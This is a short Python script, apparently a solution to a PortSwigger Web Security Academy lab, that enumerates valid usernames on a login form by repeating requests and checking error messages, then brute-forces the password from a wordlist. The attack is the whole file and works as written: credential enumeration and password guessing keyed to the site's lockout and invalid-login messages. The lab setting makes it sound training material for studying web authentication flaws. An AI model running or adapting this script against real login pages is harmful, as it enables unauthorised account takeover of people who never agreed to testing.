import requests
import sys


def check_username(url, username):

    data = f"username={username}&password=test"

    response = requests.post(url, data=data)
    # print(response.content.decode())

    c = response.content.decode()
    # print(c)
    # print(response.elapsed.total_seconds())

    return 'Invalid username or password.' not in c


def check_password(url, username, password):

    data = f"username={username}&password={password}"
    response = requests.post(url, data=data)
    c = response.content.decode()

    return 'You have made too many incorrect login attempts.' not in c and "Invalid username or password." not in c


def main():

    login_url = 'https://ac351f291f0c29f8c00d240900750052.web-security-academy.net/login'
    users_file = 'usernames.txt'
    users = [x.strip() for x in open(users_file).readlines()]
    pass_file = 'passwords.txt'
    passwords = [x.strip() for x in open(pass_file).readlines()]


    # for user in users:
    for user in ['amarillo']:

        print(f"[+] Trying username: {user}")

        f = True
        for x in range(0, 10):

            if not f:
                continue

            if check_username(login_url, user):

                f = False
                print(f"[+] Found username: {user}")

                for password in passwords:

                    # print(f"[+] Trying credentials: {user}:{password}")
                    if check_password(login_url, user, password):

                        print(f"[+] Found password for user '{user}': '{password}'")


if __name__ == '__main__':
    main()
